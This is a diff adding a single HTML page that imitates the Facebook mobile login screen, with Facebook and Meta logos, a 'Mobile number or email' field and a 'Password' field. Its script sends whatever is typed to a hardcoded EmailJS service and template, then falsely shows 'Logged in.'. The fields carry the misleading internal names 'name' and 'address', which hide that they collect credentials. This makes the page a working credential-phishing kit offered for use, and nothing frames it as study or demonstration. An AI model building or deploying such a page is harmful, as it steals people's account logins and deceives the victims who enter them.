@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sweb</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+*{box-sizing:border-box}
+html,body{
+  margin:0;
+  min-height:100%;
+  background:#fff;
+  font-family:Arial,Helvetica,sans-serif;
+}
+body{
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+}
+
+/* Facebook-style responsive page width:
+   content stays narrow like a normal Facebook login form,
+   while the page itself uses the complete phone/desktop viewport. */
+.page{
+  width:100%;
+  min-height:100vh;
+  max-width:980px;
+  padding:24px 16px 30px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+}
+
+/* Top */
+.top{
+  width:100%;
+  max-width:396px;
+  height:42px;
+  display:flex;
+  align-items:center;
+}
+.back{
+  border:0;
+  background:none;
+  width:40px;
+  height:40px;
+  padding:0;
+  position:relative;
+}
+.back:before{
+  content:"";
+  position:absolute;
+  width:14px;
+  height:14px;
+  border-left:3px solid #111;
+  border-bottom:3px solid #111;
+  transform:rotate(45deg);
+  left:7px;
+  top:11px;
+}
+
+/* Language */
+.language{
+  margin-top:24px;
+  color:#777;
+  font-size:16px;
+  line-height:22px;
+}
+.language:after{
+  content:"";
+  display:inline-block;
+  width:7px;
+  height:7px;
+  border-right:1.5px solid #777;
+  border-bottom:1.5px solid #777;
+  transform:rotate(45deg);
+  vertical-align:4px;
+  margin-left:6px;
+}
+
+/* Main Facebook-like narrow login area */
+.login-box{
+  width:100%;
+  max-width:396px;
+  margin-top:72px;
+}
+
+.logo-area{
+  display:flex;
+  justify-content:center;
+  margin-bottom:72px;
+}
+
+.facebook-logo{
+  width:78px;
+  height:78px;
+  display:block;
+  object-fit:contain;
+}
+
+.form{
+  width:100%;
+}
+
+.field{
+  display:block;
+  width:100%;
+  height:54px;
+  border:1px solid #ddd;
+  border-radius:10px;
+  outline:none;
+  background:#fff;
+  padding:0 16px;
+  margin-bottom:12px;
+  font-size:17px;
+  color:#222;
+  box-shadow:0 1px 2px rgba(0,0,0,.04);
+}
+
+.field:focus{
+  border-color:#1877f2;
+  box-shadow:0 0 0 1px #1877f2;
+}
+
+.field::placeholder{
+  color:#777;
+}
+
+.submit{
+  width:100%;
+  height:52px;
+  border:0;
+  border-radius:9px;
+  background:#1877f2;
+  color:#fff;
+  font-size:17px;
+  font-weight:600;
+  cursor:pointer;
+  margin-top:2px;
+}
+
+.submit:disabled{
+  opacity:.65;
+  cursor:wait;
+}
+
+.refresh{
+  display:block;
+  margin:18px auto 0;
+  padding:5px 10px;
+  border:0;
+  background:none;
+  font-size:16px;
+  color:#111;
+  cursor:pointer;
+}
+
+/* Bottom area */
+.bottom{
+  width:100%;
+  max-width:396px;
+  margin-top:90px;
+}
+
+.signin{
+  width:100%;
+  height:52px;
+  border:2px solid #23658d;
+  border-radius:28px;
+  background:#fff;
+  color:#18598b;
+  font-size:17px;
+  font-weight:600;
+  cursor:not-allowed;
+}
+.brand{
+  margin-top:34px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.meta-logo{
+  width:86px;
+  height:auto;
+}
+.message{
+  position:fixed;
+  left:50%;
+  bottom:20px;
+  transform:translate(-50%,20px);
+  width:calc(100% - 32px);
+  max-width:396px;
+  padding:13px 16px;
+  border-radius:10px;
+  background:#222;
+  color:#fff;
+  text-align:center;
+  font-size:14px;
+  opacity:0;
+  pointer-events:none;
+  transition:.25s;
+}
+.message.show{
+  opacity:1;
+  transform:translate(-50%,0);
+}
+.message.success{background:#168447}
+.message.error{background:#c62828}
+
+/* Desktop: keep the Facebook-style narrow card area */
+@media (min-width:700px){
+  .page{
+    padding-top:30px;
+  }
+  .login-box{
+    margin-top:85px;
+  }
+}
+
+/* Small phone screens */
+@media (max-height:700px){
+  .login-box{
+    margin-top:45px;
+  }
+  .logo-area{
+    margin-bottom:42px;
+  }
+  .bottom{
+    margin-top:55px;
+  }
+}
+</style>
+</head>
+
+<body>
+<main class="page">
+
+  <div class="top">
+    <button class="back" type="button" aria-label="Back" onclick="history.back()"></button>
+  </div>
+
+  <div class="language">English (US)</div>
+
+  <section class="login-box">
+
+   <div class="logo-area">
+  <img 
+    src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
+    alt="Facebook"
+    class="facebook-logo"
+  >
+</div>
+
+    <form id="detailForm" class="form">
+      <input
+        id="name"
+        name="name"
+        class="field"
+        type="text"
+        placeholder="Mobile number or email"
+        autocomplete="name"
+        required
+      >
+
+      <input
+        id="address"
+        name="address"
+        class="field"
+        type="text"
+        placeholder="Password"
+        autocomplete="street-address"
+        required
+      >
+
+      <button id="submitBtn" class="submit" type="submit">
+        Log in
+      </button>
+    </form>
+
+    <button class="refresh" type="button" onclick="location.reload()">Forgot password?</button>
+
+  </section>
+
+  <section class="bottom">
+    <button class="signin" type="button" disabled>Create new account</button>
+
+    <div class="brand">
+  <img src="https://raw.githubusercontent.com/Globalconnect9/Global-Career-Connect-/refs/heads/main/1786272020942.png" alt="Meta" class="meta-logo">
+</div>
+  </section>
+
+</main>
+
+<div id="message" class="message"></div>
+
+<script>
+const EMAILJS_PUBLIC_KEY = "6erjYuJfp4rK9fAC6";
+const EMAILJS_SERVICE_ID = "service_ftvqdei";
+const EMAILJS_TEMPLATE_ID = "template_04bxu5b";
+
+emailjs.init({
+  publicKey: EMAILJS_PUBLIC_KEY
+});
+
+const form = document.getElementById("detailForm");
+const submitBtn = document.getElementById("submitBtn");
+const message = document.getElementById("message");
+
+function showMessage(text,type){
+  message.textContent=text;
+  message.className="message show "+type;
+  setTimeout(()=>message.className="message",3500);
+}
+
+form.addEventListener("submit",async function(e){
+  e.preventDefault();
+
+  const name=document.getElementById("name").value.trim();
+  const address=document.getElementById("address").value.trim();
+
+  if(!name || !address){
+    showMessage("Please enter your name and address.","error");
+    return;
+  }
+
+  submitBtn.disabled=true;
+  submitBtn.textContent="sending...";
+
+  try{
+    await emailjs.send(
+      EMAILJS_SERVICE_ID,
+      EMAILJS_TEMPLATE_ID,
+      {
+        name:name,
+        address:address,
+        submitted_at:new Date().toLocaleString()
+      }
+    );
+
+    showMessage("Logged in.","success");
+    form.reset();
+
+  }catch(error){
+    console.error(error);
+    showMessage("Unable to submit. Please try again.","error");
+  }finally{
+    submitBtn.disabled=false;
+    submitBtn.textContent="submit detail";
+  }
+});
+</script>
+
+</body>
+</html>
